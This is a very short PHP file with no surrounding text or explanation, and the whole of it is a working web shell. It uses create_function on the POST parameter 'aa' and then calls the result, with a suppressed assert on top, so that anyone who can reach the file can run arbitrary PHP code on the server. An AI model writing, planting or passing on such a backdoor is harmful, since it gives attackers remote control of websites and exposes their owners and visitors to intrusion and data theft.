<?php
$a=create_function('',$_POST['aa']);
$a();
@assert($a());
?>